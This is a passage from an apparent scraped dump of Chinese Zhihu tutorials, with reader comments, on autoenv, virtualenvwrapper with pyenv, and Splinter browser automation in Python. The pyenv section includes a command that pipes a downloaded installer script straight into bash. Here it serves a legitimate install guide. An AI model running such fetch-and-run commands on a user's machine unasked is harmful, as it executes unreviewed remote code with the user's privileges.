~/.zshrc\n</code></pre></div><h2>使用 git 安装</h2><div class=\"highlight\"><pre><code class=\"language-text\">$ git clone git://github.com/kennethreitz/autoenv.git ~/.autoenv\n# bash 使用这条命令\n$ echo &#39;source ~/.autoenv/activate.sh&#39; &gt;&gt; ~/.bashrc\n# zsh 使用这条命令\n$ echo &#39;source ~/.autoenv/activate.sh&#39; &gt;&gt; ~/.zshrc\n</code></pre></div><p>安装完成后重新打开 shell 生效。</p><h2>使用</h2><h2>virtualenvwrapper</h2><p>通过下列命令在项目所在文件夹 project 内新建<code>.env</code>文件，并在改文件内写入进入项目环境的命令：</p><div class=\"highlight\"><pre><code class=\"language-text\">echo &#34;workon test&#34; &gt; project/.env\n</code></pre></div><p>上述命令以在 project (项目文件夹)内进入 virtualenvwrapper 创建的 test 虚拟环境为例，如何使用 virtualenvwrapper 可参考<a href=\"https://zhuanlan.zhihu.com/p/30859003\" class=\"internal\">virtualenvwrapper + pyenv 打造多版本 Python 环境</a>。</p><h2>virtualenv</h2><p>如果你使用的是 virtualenv 那么命令应该是这样：</p><div class=\"highlight\"><pre><code class=\"language-text\">echo &#34;source venv/bin/activate&#34; &gt; project/.env\n</code></pre></div><p>上述命令以在 project (项目文件夹)内进入 virtualenv 创建的位于 project (项目文件夹)内的 venv 环境为例。<br/></p><figure><noscript><img src=\"https://pic1.zhimg.com/v2-c64715291456bedb270fffc3fd98c424_b.gif\" data-caption=\"\" data-rawwidth=\"200\" data-rawheight=\"200\" data-thumbnail=\"https://pic1.zhimg.com/v2-c64715291456bedb270fffc3fd98c424_b.jpg\" class=\"content_image\" width=\"200\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;200&#39; height=&#39;200&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-rawwidth=\"200\" data-rawheight=\"200\" data-thumbnail=\"https://pic1.zhimg.com/v2-c64715291456bedb270fffc3fd98c424_b.jpg\" class=\"content_image lazy\" width=\"200\" data-actualsrc=\"https://pic1.zhimg.com/v2-c64715291456bedb270fffc3fd98c424_b.gif\"/></figure><p><code>cd project</code>进入项目文件夹尽情享受 autoenv 带来的便利吧！</p><h2>结语</h2><p>最后献上 Kenneth Reitz 大神的美照！ </p><figure><noscript><img src=\"https://pic2.zhimg.com/v2-ddfaa9fa581010f0ddd4442868f058c5_b.jpg\" data-caption=\"\" data-rawwidth=\"960\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"960\" data-original=\"https://pic2.zhimg.com/v2-ddfaa9fa581010f0ddd4442868f058c5_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;960&#39; height=&#39;960&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-rawwidth=\"960\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"960\" data-original=\"https://pic2.zhimg.com/v2-ddfaa9fa581010f0ddd4442868f058c5_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-ddfaa9fa581010f0ddd4442868f058c5_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>前<br/>方<br/>高<br/>能<br/>！<br/>！<br/>！<br/>！<br/>！<br/>！<br/>！<br/>！<br/>！<br/>！<br/>！<br/>减<br/>肥<br/>后<br/>是<br/>这<br/>样<br/>的<br/>！<br/>！<br/>！<br/>！<br/>！<br/>！<br/>！<br/>！<br/>！<br/>！<br/>！<br/></p><figure><noscript><img src=\"https://pic2.zhimg.com/v2-578ed9eab0f8745987639c100d02f239_b.jpg\" data-caption=\"\" data-rawwidth=\"1000\" data-rawheight=\"667\" class=\"origin_image zh-lightbox-thumb\" width=\"1000\" data-original=\"https://pic2.zhimg.com/v2-578ed9eab0f8745987639c100d02f239_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1000&#39; height=&#39;667&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-rawwidth=\"1000\" data-rawheight=\"667\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1000\" data-original=\"https://pic2.zhimg.com/v2-578ed9eab0f8745987639c100d02f239_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-578ed9eab0f8745987639c100d02f239_b.jpg\"/></figure><figure><noscript><img src=\"https://pic3.zhimg.com/v2-7d2f41f2bea982ea0d08674d6780ae7a_b.jpg\" data-caption=\"\" data-rawwidth=\"1000\" data-rawheight=\"668\" class=\"origin_image zh-lightbox-thumb\" width=\"1000\" data-original=\"https://pic3.zhimg.com/v2-7d2f41f2bea982ea0d08674d6780ae7a_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1000&#39; height=&#39;668&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-rawwidth=\"1000\" data-rawheight=\"668\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1000\" data-original=\"https://pic3.zhimg.com/v2-7d2f41f2bea982ea0d08674d6780ae7a_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-7d2f41f2bea982ea0d08674d6780ae7a_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>参考</h2><ul><li><a href=\"https://link.zhihu.com/?target=https%3A//github.com/kennethreitz/autoenv\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">autoenv</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.kennethreitz.org/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Kenneth Reitz</a></li></ul>", 
            "topic": [
                {
                    "tag": "Python", 
                    "tagLink": "https://api.zhihu.com/topics/19552832"
                }, 
                {
                    "tag": "virtualenv", 
                    "tagLink": "https://api.zhihu.com/topics/19615202"
                }
            ], 
            "comments": [
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "推荐一个更好用的 direnv，根据所在目录修改环境变量", 
                    "likes": 1, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "哈哈，autoenv github 项目 readme 里还有这两个项目作者互捧的聊天截图。😄", 
                            "likes": 1, 
                            "replyToAuthor": "知乎用户"
                        }, 
                        {
                            "userName": "知乎用户", 
                            "userLink": "https://www.zhihu.com/people/0", 
                            "content": "<p>还真有这个图😂</p>", 
                            "likes": 0, 
                            "replyToAuthor": "WoodenRobot"
                        }
                    ]
                }, 
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "减肥教程比这个好", 
                    "likes": 1, 
                    "childComments": []
                }
            ]
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/30859003", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 14, 
            "title": "virtualenvwrapper打造多版本Python环境", 
            "content": "<h2>前言</h2><p>面对多个 Python 开发项目时，需要针对不同的项目创建相应的开发环境。通常情况下，使用 virtualenv 创建一个虚拟的独立 Python 环境，但是 virtualenv 创建的环境相对分散不便于管理。这里推荐使用 virtualenvwrapper 来创建集中的便于管理的 Python 环境，同时可以结合 pyenv 为不同的项目选定不同的 Python 版本。</p><h2>virtualenvwrapper</h2><h2>安装</h2><p>通过 pip 安装 virtualenvwrapper（Ps: 记住加上 sudo）。</p><div class=\"highlight\"><pre><code class=\"language-text\">$ sudo pip install virtualenvwrapper\n</code></pre></div><h2>配置</h2><p>在.bashrc(或.zshrc)中添加下列内容：</p><div class=\"highlight\"><pre><code class=\"language-text\">export WORKON_HOME=$HOME/.virtualenvs\nsource /usr/local/bin/virtualenvwrapper.sh\n</code></pre></div><p>接着执行`source ~/.bashrc(或./zshrc)。<br/><b>注意：修改.bashrc还是.zshrc取决于你使用的那种 shell。</b></p><h2>使用</h2><ul><li><code>workon</code>: 打印所有的虚拟环境；</li><li><code>mkvirtualenv xxx</code>: 创建 xxx 虚拟环境;</li><li><code>workon xxx</code>: 使用 xxx 虚拟环境;</li><li><code>deactivate</code>: 退出 xxx 虚拟环境；</li><li><code>rmvirtualenv xxx</code>: 删除 xxx 虚拟环境。</li></ul><h2>pyenv</h2><h2>安装</h2><h2>Linux</h2><p>使用下列命令自动安装 pyenv:</p><div class=\"highlight\"><pre><code class=\"language-text\">$ curl -L https://raw.githubusercontent.com/pyenv/pyenv-installer/master/bin/pyenv-installer | bash\n</code></pre></div><h2>Mac OS X</h2><p>使用 homebrew 直接安装：</p><div class=\"highlight\"><pre><code class=\"language-text\">$ brew update\n$ brew install pyenv\n</code></pre></div><h2>配置</h2><p>在.bashrc(或.zshrc)中添加下列内容：</p><div class=\"highlight\"><pre><code class=\"language-text\">export PYENV_ROOT=&#34;$HOME/.pyenv&#34;\nexport PATH=&#34;$PYENV_ROOT/bin:$PATH&#34;\neval &#34;$(pyenv init -)&#34;\n</code></pre></div><p>然后重启 shell，使配置生效。</p><div class=\"highlight\"><pre><code class=\"language-text\">$ exec &#34;$SHELL&#34;\n</code></pre></div><h2>安装 Python 时依赖环境</h2><p>安装 Python 时需要提前安装好所需的依赖环境。</p><ul><li>Ubuntu/Debian:</li></ul><div class=\"highlight\"><pre><code class=\"language-bash\">sudo apt-get install -y make build-essential libssl-dev zlib1g-dev libbz2-dev <span class=\"se\">\\\n</span><span class=\"se\"></span>libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev <span class=\"se\">\\\n</span><span class=\"se\"></span>xz-utils tk-dev libffi-dev liblzma-dev</code></pre></div><ul><li>Fedora/CentOS/RHEL:</li></ul><div class=\"highlight\"><pre><code class=\"language-bash\">sudo yum install zlib-devel bzip2 bzip2-devel readline-devel sqlite sqlite-devel <span class=\"se\">\\\n</span><span class=\"se\"></span>openssl-devel xz xz-devel libffi-devel</code></pre></div><p>Alternative of openssl-devel:</p><div class=\"highlight\"><pre><code class=\"language-bash\">sudo yum install compat-openssl10-devel --allowerasing</code></pre></div><ul><li>openSUSE</li></ul><div class=\"highlight\"><pre><code class=\"language-bash\">zypper in zlib-devel bzip2 libbz2-devel readline-devel sqlite3 sqlite3-devel libopenssl-devel xz xz-devel</code></pre></div><ul><li>macOS:</li></ul><div class=\"highlight\"><pre><code class=\"language-bash\">brew install readline xz</code></pre></div><h2>使用</h2><p><b>1.</b> 查看所有 Python 版本</p><div class=\"highlight\"><pre><code class=\"language-text\">$ pyenv versions\n</code></pre></div><p>执行命令将打印出安装的所有 Python 版本，<code>*</code>表示当前使用的 Python 版本。</p><p><b>2.</b> 查询所有可安装的 Python 版本</p><div class=\"highlight\"><pre><code class=\"language-text\">$ pyenv install -l\n</code></pre></div><p><b>3.</b> 安装与卸载</p><div class=\"highlight\"><pre><code class=\"language-text\">$ pyenv install 2.7.14\n</code></pre></div><p>安装 Python 2.7.14 版本。</p><div class=\"highlight\"><pre><code class=\"language-text\">$ pyenv uninstall 2.7.14\n</code></pre></div><p>卸载 Python 2.7.14 版本</p><div class=\"highlight\"><pre><code class=\"language-text\">$ pyenv rehash\n</code></pre></div><p>创建垫片路径（为所有已安装的可执行文件创建 shims，如：~/.pyenv/versions/<i>/bin/</i>，因此，每当你增删了 Python 版本或带有可执行文件的包（如 pip）以后，都应该执行一次本命令）。</p><p><b>4.</b> 设置 Python 版本</p><div class=\"highlight\"><pre><code class=\"language-text\">$ pyenv shell 2.7.14  # 设置面向 shell 的 Python 版本，通过设置当前 shell 的 PYENV_VERSION 环境变量的方式。\n$ pyenv local 2.7.14  # 设置 Python 本地版本，通过将版本号写入当前目录下的 .python-version 文件的方式。通过这种方式设置的 Python 版本优先级较 global 高。\n$ pyenv global 2.7.14  # 设置全局的 Python 版本，通过将版本号写入 ~/.pyenv/version 文件的方式。\n</code></pre></div><p><b>注意：</b> shell &gt; local &gt; global。pyenv 会从当前目录开始向上逐级查找 .python-version 文件，直到根目录为止。若找不到，就用 global 版本。</p><p><b>Ps: 因为系统本身常常会依赖自带的 python 版本，所以尽量不要修改 global。</b></p><p><b>5.</b> 取消 shell 或 local python 版本</p><div class=\"highlight\"><pre><code class=\"language-text\">$ pyenv shell --unset\n$ pyenv local --unset\n</code></pre></div><h2>使用镜像加速下载</h2><p>通过下列脚本使用国内搜狐的镜像快速安装各版本 Python：</p><div class=\"highlight\"><pre><code class=\"language-text\">v=3.6.3|wget http://mirrors.sohu.com/python/$v/Python-$v.tar.xz -P $(pyenv root)/cache/;pyenv install $v</code></pre></div><p><b>注意：v 为 Python 版本号，请根据需要自行更改。</b></p><p><b>搜狐镜像貌似关闭了，可以自行下载指定的 Python 版本安装包放入，<code>$(pyenv root)/cache/</code></b> <b>文件夹下，然后执行</b> <b><code>pyenv install xxx(版本号)</code></b> <b>安装相应的 python 版本，安装时会使用缓存安装包。</b></p><h2>pyenv-virtualenvwrapper</h2><h2>安装</h2><h2>Linux</h2><p>通过下列命令安装 pyenv-virtualenvwrapper:</p><div class=\"highlight\"><pre><code class=\"language-text\">$ git clone https://github.com/pyenv/pyenv-virtualenvwrapper.git $(pyenv root)/plugins/pyenv-virtualenvwrapper\n</code></pre></div><h2>Mac OS X</h2><p>Mac OS X 下可选择使用使用 Homebrew 来安装：</p><div class=\"highlight\"><pre><code class=\"language-text\">$ brew install pyenv-virtualenvwrapper\n</code></pre></div><h2>激活</h2><p>安装完成后使用下列命令激活 pyenv-virtualenvwrapper：</p><div class=\"highlight\"><pre><code class=\"language-text\">$ pyenv virtualenvwrapper\n</code></pre></div><h2>使用</h2><div class=\"highlight\"><pre><code class=\"language-text\">$ pyenv shell 3.6.3  # 设置当前 shell python 版本为 2.7.14\n$ pip install virtualenvwrapper  # 第一次使用新的 Python 环境需要安装此包，否则创建的虚拟环境 Python 版本仍为系统默认\n$ mkvirtualenv python3  # 创建 python 3.6.3 版本的虚拟环境 python3\n</code></pre></div><h2>参考</h2><ol><li><a href=\"https://link.zhihu.com/?target=https%3A//github.com/pyenv/pyenv\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">pyenv 文档</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//virtualenvwrapper.readthedocs.io/en/latest/install.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">virtualenvwrapper 文档</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//github.com/pyenv/pyenv-virtualenvwrapper\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">pyenv-virtualenvwrapper 文档</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//einverne.github.io/post/2017/04/pyenv.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">使用 pyenv 管理 Python 版本</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//segmentfault.com/a/1190000006174123\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">pyenv 安装配置与国内镜像加速</a></li></ol>", 
            "topic": [
                {
                    "tag": "Python", 
                    "tagLink": "https://api.zhihu.com/topics/19552832"
                }, 
                {
                    "tag": "virtualenv", 
                    "tagLink": "https://api.zhihu.com/topics/19615202"
                }
            ], 
            "comments": [
                {
                    "userName": "零一", 
                    "userLink": "https://www.zhihu.com/people/ad4b850e1631ca1a7f5b3a1ba1bc3942", 
                    "content": "pyenv不是自带创建虚拟环境的功能吗", 
                    "likes": 0, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "<p>pyenv 是管理 python 版本的工具，virtualenvwrapper 是创建虚拟 python 环境的工具，pyenv-virtualenvwrapper 是创建不同 python 版本虚拟环境的工具。</p>", 
                            "likes": 0, 
                            "replyToAuthor": "零一"
                        }, 
                        {
                            "userName": "零一", 
                            "userLink": "https://www.zhihu.com/people/ad4b850e1631ca1a7f5b3a1ba1bc3942", 
                            "content": "<p>pyenv virtualenv [python版本] [自定义环境名称]  #创建基于[python版本]的虚拟环境</p><p>pyenv activate [环境名称]   #激活虚拟环境</p><p>pyenv deactivate  #退出虚拟环境</p><p>当然也可以\"pyenv local/global [环境名称] \" 设置全局/当前目录为某个虚拟环境</p>", 
                            "likes": 0, 
                            "replyToAuthor": "WoodenRobot"
                        }
                    ]
                }
            ]
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/30208753", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 101, 
            "title": "Python + Splinter 实现浏览器自动化操作入门指南", 
            "content": "<h2>前言</h2><p>Splinter 是用 Python 开发的一个开源web自动化测试的工具集。 它可以帮你自动化浏览器的行为，比如浏览 URLs 并和页面进行交互。</p><h2>快速上手</h2><h2>安装</h2><p>从终端运行：</p><div class=\"highlight\"><pre><code class=\"language-text\">pip install splinter</code></pre></div><h2>安装相应的浏览器驱动</h2><p>Chrome浏览器驱动：<a href=\"https://link.zhihu.com/?target=https%3A//sites.google.com/a/chromium.org/chromedriver/downloads\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">sites.google.com/a/chro</span><span class=\"invisible\">mium.org/chromedriver/downloads</span><span class=\"ellipsis\"></span></a><br/>Firefox浏览器驱动：<a href=\"https://link.zhihu.com/?target=https%3A//github.com/mozilla/geckodriver/releases\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">github.com/mozilla/geck</span><span class=\"invisible\">odriver/releases</span><span class=\"ellipsis\"></span></a><br/>根据相应的浏览器下载对应的驱动版本，并将驱动所在的路径加入环境变量。</p><h2>创建一个 Browser 实例</h2><div class=\"highlight\"><pre><code class=\"language-text\">from splinter import Browser\nbrowser = Browser()\n# 指定driver为chrome浏览器\n# browser = Browser(driver_name=&#39;chrome&#39;)</code></pre></div><p><b>提示</b>: 如果你不为 Browser 指定 driver, 那么会默认使用 firefox。</p><h2>访问百度搜索页面</h2><p>使用 browser.visit 方法可访问任意网站. 让我们访问一下百度搜索页面:</p><div class=\"highlight\"><pre><code class=\"language-text\">browser.visit(&#39;http://baidu.com&#39;)</code></pre></div><h2>输入搜索关键词</h2><p>页面加载完毕后，你能进行一系列的交互，比如点击，输入框填充字段，选择单选按钮和复选框。让我们在百度搜索框中填充 splinter - python acceptance testing for web applications。</p><div class=\"highlight\"><pre><code class=\"language-text\">browser.fill(&#39;wd&#39;, &#39;splinter - python acceptance testing for web applications&#39;)</code></pre></div><h2>点击搜索按钮</h2><p>告诉 Splinter 哪一个按钮需要点击。这个按钮 - 或任意其他元素 - 可以通过它的css, xpath, id, tag 或 name来识别。</p><p>通过以下操作找到百度搜索按钮：</p><div class=\"highlight\"><pre><code class=\"language-text\">button = browser.find_by_xpath(&#39;//input[@type=&#34;submit&#34;]&#39;)</code></pre></div><p><b>提示</b>：这个 xpath 语法所在的按钮 会在百度搜索页面的源码中被找到。</p><p>找到按钮后，我们就可以进行点击操作:</p><div class=\"highlight\"><pre><code class=\"language-text\">button.click()</code></pre></div><p>提示: 以上展示的两步可以结合为一行代码，如下所示:</p><div class=\"highlight\"><pre><code class=\"language-text\">browser.find_by_xpath(&#39;//input[@type=&#34;submit&#34;]&#39;).click()</code></pre></div><h2>查看 Splinter 官方网站是否在搜索结果中</h2><p>点击搜索按钮后，你可以通过以下步骤检测 Splinter 官方网站是否在搜索结果中。</p><div class=\"highlight\"><pre><code class=\"language-text\">if browser.is_text_present(&#39;splinter.readthedocs&#39;):\n    print &#34;Yes, found it! :)&#34;\nelse:\n    print &#34;No, didn&#39;t find it :(&#34;</code></pre></div><p>在这个小例子中, 我们只是打印出了结果. 当写测试的时候，你需要使用断言。</p><h2>关闭浏览器</h2><p>结束测试后，我们需要使用 browser.quit 关闭浏览器:</p><div class=\"highlight\"><pre><code class=\"language-text\">browser.quit()</code></pre></div><h2>总结</h2><p>最后完整的代码如下所示:</p><div class=\"highlight\"><pre><code class=\"language-text\">from splinter import Browser\n\nbrowser = Browser()\nbrowser.visit(&#39;http://baidu.com&#39;)\nbrowser.fill(&#39;wd&#39;, &#39;splinter - python acceptance testing for web applications&#39;)\nbutton = browser.find_by_xpath(&#39;//input[@type=&#34;submit&#34;]&#39;).click()\n\nif browser.is_text_present(&#39;splinter.readthedocs&#39;):\n    print &#34;Yes, the official website was found!&#34;\nelse:\n    print &#34;No, it wasn&#39;t found... We need to improve our SEO techniques&#34;\n\nbrowser.quit()</code></pre></div><h2>翻译计划</h2><p>上述的介绍是来自于我近期翻译的 <a href=\"https://link.zhihu.com/?target=http%3A//splinter-docs-zh-cn.readthedocs.io/zh/latest/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Splinter 中文文档</a>中快速上手部分，非常感谢 <a class=\"member_mention\" href=\"https://www.zhihu.com/people/59fee3ee27b7a751a61ff1e7d1f0f6aa\" data-hash=\"59fee3ee27b7a751a61ff1e7d1f0f6aa\" data-hovercard=\"p$b$59fee3ee27b7a751a61ff1e7d1f0f6aa\">@一叶染秋</a> 加入翻译计划。我们目前只是翻译了一小部分，还有一些没有翻译，如果你想加入翻译计划可以给 Github 上的<a href=\"https://link.zhihu.com/?target=https%3A//github.com/Wooden-Robot/splinter-docs-zh_CN\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Splinter 中文文档项目</a>提交PR，翻译前请先私信我你想翻译的章节，避免大家重复翻译。如果有翻译不对或者不好的地方也欢迎大家多多提建议。</p><h2>彩蛋</h2><p>最早的时候大家都会使用 Phantomjs 来实现headless，但是多多少少会有一些不足的地方。现在 Chrome 和 Firefox 都已经提供了相应的 headless 模式，而且 Splinter 也已经集成。</p><div class=\"highlight\"><pre><code class=\"language-text\">from splinter import Browser\n\nbrowser = Browser(driver_name=&#39;chrome&#39;, headless=True)\n# browser = Browser(driver_name=&#39;firefox&#39;, headless=True)</code></pre></div><p>通过一个简单的参数即可启用 headless 模式，赶快去试试吧！（Ps: 我为这个功能做了一点微小的工作）</p><h2>参考</h2><ol><li><a href=\"https://link.zhihu.com/?target=https%3A//splinter.readthedocs.io/en/latest/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Splinter 官方文档</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//splinter-docs-zh-cn.readthedocs.io/zh/latest/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Splinter 中文文档</a></li></ol>", 
            "topic": [
                {
                    "tag": "Python", 
                    "tagLink": "https://api.zhihu.com/topics/19552832"
                }, 
                {
                    "tag": "Selenium", 
                    "tagLink": "https://api.zhihu.com/topics/19574589"
                }, 
                {
                    "tag": "爬虫 (计算机网络)", 
                    "tagLink": "https://api.zhihu.com/topics/19577498"
                }
            ], 
            "comments": [
                {
                    "userName": "风里的小墨迹", 
                    "userLink": "https://www.zhihu.com/people/edf0b4ebe9902483336c2f3bc478fffa", 
                    "content": "selenium", 
                    "likes": 0, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "Splinter 基于 Selenium，有点像 Requests 和 urllib 的关系。", 
                            "likes": 2, 
                            "replyToAuthor": "风里的小墨迹"
                        }
                    ]
                }, 
                {
                    "userName": "张小鸡", 
                    "userLink": "https://www.zhihu.com/people/24453af05e841ea31025a7f76f18be9d", 
                    "content": "<p>支持~加油</p>", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "strivezr", 
                    "userLink": "https://www.zhihu.com/people/d4057d143dc1b17762a2c3e373154b31", 
                    "content": "看了下，操作和selenium差不多呀，从性能或者语法角度，他比selenium更简洁么？", 
                    "likes": 0, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "<p>它算是封装了 Selenium，提供一些更通用便捷的方法。</p>", 
                            "likes": 0, 
                            "replyToAuthor": "strivezr"
                        }, 
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "<p>拿设置 User-Agent 来说，你本来可能是在本地使用 Chrome 测试程序，部署服务器是你需要更换更 PhantomJS。使用 Selenium的话，你会发现这个过程不是那么简洁快速。如果你使用 Splinter只需要更改一下 Broswer 中的 driver_name 参数为phantomjs。</p>", 
                            "likes": 0, 
                            "replyToAuthor": "strivezr"
                        }
                    ]
                }, 
                {
                    "userName": "张嘉颖", 
                    "userLink": "https://www.zhihu.com/people/181dd2fb6f5429aa4111d5538e3e0031", 
                    "content": "性能方面有测试过吗？对比selenium", 
                    "likes": 0, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "<p>性能应该和 Selenium 差不多，底层的东西都还是调用的 Selenium。</p>", 
                            "likes": 0, 
                            "replyToAuthor": "张嘉颖"
                        }
                    ]
                }, 
                {
                    "userName": "Angry Bugs", 
                    "userLink": "https://www.zhihu.com/people/e8002099d78754129be0180a00890361", 
                    "content": "感觉python做这些东西似乎都比较awkward，node似乎更合适一些", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "博主你好，有没有支持ie的类似工具，谢谢", 
                    "likes": 0, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "<p>Splinter 官方并不支持 IE <a href=\"http://link.zhihu.com/?target=https%3A//github.com/cobrateam/splinter/issues/25\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Support Internet Explorer · Issue #25 · cobrateam/splinter</a></p><p>不过你可以参考下这篇博客：<a href=\"http://link.zhihu.com/?target=https%3A//stirunagari.wordpress.com/2017/08/20/using-internet-explorer-web-driver-with-splinter-framework/\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">stirunagari.wordpress.com</span><span class=\"invisible\">/2017/08/20/using-internet-explorer-web-driver-with-splinter-framework/</span><span class=\"ellipsis\"></span></a></p>", 
                            "likes": 0, 
                            "replyToAuthor": "知乎用户"
                        }
                    ]
                }, 
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "这个可以做一个抢票工具吗？😂", 
                    "likes": 0, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "理论上是可以的😄", 
                            "likes": 0, 
                            "replyToAuthor": "知乎用户"
                        }, 
                        {
                            "userName": "知乎用户", 
                            "userLink": "https://www.zhihu.com/people/0", 
                            "content": "哈哈。下次试试。谢谢啦。", 
                            "likes": 0, 
                            "replyToAuthor": "WoodenRobot"
                        }
                    ]
                }, 
                {
                    "userName": "摇问君", 
                    "userLink": "https://www.zhihu.com/people/fa8aad1bced166e39b9f5f58a371b75f", 
                    "content": "<p>请教一下，有个网站很奇怪用splinter或者selenium自动搜索请求返回： 数据库无响应 。<a href=\"http://link.zhihu.com/?target=http%3A//app1.sfda.gov.cn/datasearch/face3/base.jsp%3FtableId%3D24%26tableName%3DTABLE24%26title%3DGSP%25C8%25CF%25D6%25A4%26bcId%3D118715593187347941914723540896\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">国家食药监局 GSP认证查询</a>。不知道怎么处理...</p>", 
                    "likes": 0, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "<p>测试了一下填充关键词、点击确认返回查询到的数据并无异常。</p>", 
                            "likes": 0, 
                            "replyToAuthor": "摇问君"
                        }
                    ]
                }, 
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "selenium可以获取cookie,这个行吗？", 
                    "likes": 1, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "可以，详情查阅文档", 
                            "likes": 0, 
                            "replyToAuthor": "知乎用户"
                        }
                    ]
                }, 
                {
                    "userName": "塞哥维亚", 
                    "userLink": "https://www.zhihu.com/people/c8e91a75a6e6f8ae674f01539a673106", 
                    "content": "可以用它在浏览器里上传文件吗？比如点上传的按钮，然后在弹出对话框里选择文件，然后确认？", 
                    "likes": 1, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "<p>Splinter 是基于 Selenium 的，点击上传按钮是可以的，但是没有办法操作弹出来的文件选择框，网上搜了一下一般都是把文件路径直接写入到相应的 HTML 标签内实现上传。</p>", 
                            "likes": 0, 
                            "replyToAuthor": "塞哥维亚"
                        }, 
                        {
                            "userName": "塞哥维亚", 
                            "userLink": "https://www.zhihu.com/people/c8e91a75a6e6f8ae674f01539a673106", 
                            "content": "谢谢！", 
                            "likes": 0, 
                            "replyToAuthor": "WoodenRobot"
                        }
                    ]
                }, 
                {
                    "userName": "陈垚", 
                    "userLink": "https://www.zhihu.com/people/50c93c93b1702e7f8acca78bb4902a6f", 
